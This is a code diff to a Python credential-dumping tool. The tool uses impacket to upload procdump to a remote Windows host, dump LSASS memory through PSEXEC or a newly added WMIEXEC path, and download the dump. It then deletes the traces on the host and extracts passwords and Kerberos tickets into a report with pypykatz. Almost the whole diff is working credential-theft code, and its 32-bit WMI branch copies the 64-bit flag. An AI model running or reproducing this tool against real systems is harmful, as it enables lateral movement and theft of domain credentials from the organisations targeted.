@@ -11,6 +11,7 @@ from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
 from configuration import src_x32, src_x64
 from argparse import Namespace
 from psexec import PSEXEC
+from wmiexec import WMIEXEC
 from os import path
 import re
 import json
@@ -30,8 +31,9 @@ from pypykatz.remote.cmdhelper import RemoteCMDHelper
 
 
 class Dumper:
-    def __init__(self, username, password, domain, target):
+    def __init__(self, username, password, domain, target, auth):
         self.target = target
+        self.auth = auth
         if domain is None:
             domain = ""
         self.credentials = {
@@ -43,6 +45,7 @@ class Dumper:
         self.host_info = self.enum_host_info()
 
     def enum_host_info(self):
+        print("Performing enumeration")
         info_dict = {}
         self.smb.login(
             user=self.credentials["username"],
@@ -56,7 +59,7 @@ class Dumper:
         info_dict.update({"os": os})
         info_dict.update({"domain": domain})
         info_dict.update({"arch": arch})
-
+        print("Done")
         return info_dict
 
     def get_arch(self):
@@ -88,48 +91,25 @@ class Dumper:
             return 32
 
     def upload_file(self):
+        print("Uploading file")
         if self.host_info["arch"] == 64:
             src = src_x64
             filename = re.sub(r"\d+", "", path.basename(src))
-            self.smb.putFile(
-                "C$",
-                filename,
-                open(src, "rb").read,
-            )
+            self.smb.putFile("C$", filename, open(src, "rb").read)
         elif self.host_info["arch"] == 32:
             src = src_x32
             filename = re.sub(r"\d+", "", path.basename(src))
-            self.smb.putFile(
-                "C$",
-                filename,
-                open(src, "rb").read,
-            )
+            self.smb.putFile("C$", filename, open(src, "rb").read)
         else:
             print("Something went wrong")
             sys.exit(1)
+        print("Done")
 
     def exec_procdump(self):
-        executer = PSEXEC(
-            "C:\\procdump.exe -accepteula",
-            None,
-            None,
-            None,
-            int(445),
-            self.credentials["username"],
-            self.credentials["password"],
-            self.credentials["domain"],
-            None,
-            None,
-            False,
-            None,
-            "",
-        )
-        executer.run(
-            remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
-        )
-        if self.host_info["arch"] == 64:
+        print("Executing procdump")
+        if self.auth == "psexec":
             executer = PSEXEC(
-                f"C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+                "C:\\procdump.exe -accepteula",
                 None,
                 None,
                 None,
@@ -143,45 +123,98 @@ class Dumper:
                 None,
                 "",
             )
-        else:
-            executer = PSEXEC(
-                f"C:\\Users\\{self.credentials['username']}\\procdump.exe -ma lsass.exe C:\\lsass_dump",
-                None,
-                None,
-                None,
-                int(445),
-                self.credentials["username"],
-                self.credentials["password"],
-                self.credentials["domain"],
-                None,
-                None,
-                False,
-                None,
-                "",
+            executer.run(
+                remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
             )
-        executer.run(
-            remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
-        )
+            if self.host_info["arch"] == 64:
+                executer = PSEXEC(
+                    f"C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+                    None,
+                    None,
+                    None,
+                    int(445),
+                    self.credentials["username"],
+                    self.credentials["password"],
+                    self.credentials["domain"],
+                    None,
+                    None,
+                    False,
+                    None,
+                    "",
+                )
+            else:
+                executer = PSEXEC(
+                    f"C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
+                    None,
+                    None,
+                    None,
+                    int(445),
+                    self.credentials["username"],
+                    self.credentials["password"],
+                    self.credentials["domain"],
+                    None,
+                    None,
+                    False,
+                    None,
+                    "",
+                )
+            executer.run(
+                remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
+            )
+        elif self.auth == "wmiexec":
+            executer = WMIEXEC(
+                command="C:\\procdump.exe -accepteula",
+                username=self.credentials["username"],
+                password=self.credentials["password"],
+                domain=self.credentials["domain"],
+                hashes=None,
+                aesKey=None,
+                share="C$",
+                noOutput=False,
+                doKerberos=False,
+                kdcHost=None,
+            )
+            executer.run(self.host_info["target"])
+            if self.host_info["arch"] == 64:
+                executer = WMIEXEC(
+                    command="C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+                    username=self.credentials["username"],
+                    password=self.credentials["password"],
+                    domain=self.credentials["domain"],
+                    hashes=None,
+                    aesKey=None,
+                    share="C$",
+                    noOutput=False,
+                    doKerberos=False,
+                    kdcHost=None,
+                )
+            else:
+                executer = WMIEXEC(
+                    command="C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+                    username=self.credentials["username"],
+                    password=self.credentials["password"],
+                    domain=self.credentials["domain"],
+                    hashes=None,
+                    aesKey=None,
+                    share="C$",
+                    noOutput=False,
+                    doKerberos=False,
+                    kdcHost=None,
+                )
+            executer.run(self.host_info["target"])
+        print("Done")
 
     def dump_lsass(self):
         print("Dumping")
-        self.smb.getFile(
-            "C$",
-            "/lsass_dump.dmp",
-            open("lsass_dump.dmp", "wb").write,
-        )
-        print("Finished")
+        self.smb.getFile("C$", "lsass_dump.dmp", open("lsass_dump.dmp", "wb").write)
+        print("Done")
 
     def clear_out(self):
         print("Starting ClearOut")
-        self.smb.deleteFile(
-            "C$", "/lsass_dump.dmp"
-        )
-        self.smb.deleteFile(
-            "C$", "/procdump.exe"
-        )
+        self.smb.deleteFile("C$", "lsass_dump.dmp")
+        self.smb.deleteFile("C$", "procdump.exe")
         self.smb.close()
-        print("ClearOut Finished")
+        print("ClearOut Done")
 
     @staticmethod
     def dump_to_pypykatz(dump_file="./lsass_dump.dmp"):
@@ -213,7 +246,7 @@ class Dumper:
             helper.execute(args)
         print("Removing dump file")
         os.remove(dump_file)
-        print("Finished")
+        print("Done")
 
     @staticmethod
     def create_report(filename, verbose):
@@ -304,7 +337,7 @@ class Dumper:
                                     f"Tickets--{el['domainname']} / {el['username']}:{el['tickets']}\n"
                                 )
         os.remove("./temp_report.json")
-        print("Finished :)")
+        print("Done :)")
 
     def run(self):
         self.upload_file()
